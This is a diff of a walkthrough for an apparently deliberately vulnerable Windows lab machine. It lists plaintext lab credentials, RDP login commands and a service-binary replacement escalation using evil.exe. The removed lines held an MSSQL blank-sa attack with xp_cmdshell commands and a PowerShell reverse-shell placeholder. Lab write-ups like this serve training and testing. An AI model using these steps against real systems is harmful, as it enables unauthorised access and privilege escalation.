@@ -24,7 +24,6 @@
 | orbital | securepassword | MD5 hash in SMB share |
 | ops | 9ksP311p | |
 | Administrator | 5EVB7Zmp | |
-| sa (MSSQL) | (blank) | SQL Server account |
 
 ---
 
@@ -36,13 +35,6 @@
 - Anonymous/guest access enabled
 - Contains `hashes.txt` with MD5 password hashes
 
-### Microsoft SQL Server
-- Instance: `MSSQLSERVER`
-- Port: `1433`
-- `sa` account has **blank password**
-- `xp_cmdshell` is **enabled**
-- Database: `SunSpire` (solar panel telemetry data)
-
 ### Remote Desktop (RDP)
 - Listening on port `:3389`
 - Network Level Authentication (NLA) disabled
@@ -51,7 +43,7 @@
 ### SunSpire Backup Agent
 - Service name: `SunspireBackup`
 - Path: `C:\Program Files\Sunspire Backup\backup.exe`
-- Registered with **unquoted service path** (vulnerability)
+- backup.exe has weak permissions
 
 ---
 
@@ -82,27 +74,6 @@ The public SMB share contains MD5 hashes that can be cracked.
 5. RDP as orbital user:
    ```bash
    xfreerdp /v:<target_ip> /u:orbital /p:securepassword
-   ```
-
-#### Option 2: MSSQL with Blank sa Password
-The SQL Server has sa account with no password and xp_cmdshell enabled.
-
-1. Connect to MSSQL:
-   ```bash
-   # Using mssqlclient (Impacket)
-   mssqlclient.py sa@<target_ip> -windows-auth
-   
-   # Or using sqsh
-   sqsh -S <target_ip> -U sa -P ''
-   ```
-2. Execute OS commands via xp_cmdshell:
-   ```sql
-   EXEC xp_cmdshell 'whoami';
-   EXEC xp_cmdshell 'net user';
-   ```
-3. Get a reverse shell:
-   ```sql
-   EXEC xp_cmdshell 'powershell -e <base64_encoded_payload>';
    ```
 
 ---
@@ -137,19 +108,17 @@ The SunSpire Backup Agent service has an unquoted path with spaces.
 1. Check service path:
    ```powershell
    wmic service get name,displayname,pathname | findstr /i "Sunspire"
-   # Shows: C:\Program Files\Sunspire Backup\backup.exe (unquoted)
+   # Shows: C:\Program Files\Sunspire Backup\backup.exe
    ```
-2. The service path allows hijacking at:
-   - `C:\Program.exe`
-   - `C:\Program Files\Sunspire.exe`
-3. Place malicious executable:
+2. The Sunspire Backup directory is writable
    ```powershell
-   # If C:\Program Files\Sunspire Backup is writable
-   copy evil.exe "C:\Program Files\Sunspire.exe"
+   # Since C:\Program Files\Sunspire Backup is writable
+   copy evil.exe "C:\Program Files\Sunspire Backup\Backup.exe"
    ```
 4. Restart the service or wait for system reboot:
    ```powershell
    Restart-Service SunspireBackup
+
    ```
 
 ---
@@ -167,7 +136,7 @@ An RDP connection file in the orbital user's Documents folder provides access to
    ```
    helios-admin.rdp
    ```
-3. Double-click to connect to helios, or extract connection details:
+3. Double-click to connect to helios, and open the file extract pyre user password (base64 encoded):
    ```powershell
    type C:\Users\orbital\Documents\helios-admin.rdp
    ```
@@ -179,7 +148,6 @@ An RDP connection file in the orbital user's Documents folder provides access to
 
 ### Services
 - [ ] SMB (Anonymous share on :445)
-- [ ] MSSQL (SQL Server on :1433)
 
 ### Control Files
 - [ ] `C:\Administrator\ctrl.txt`
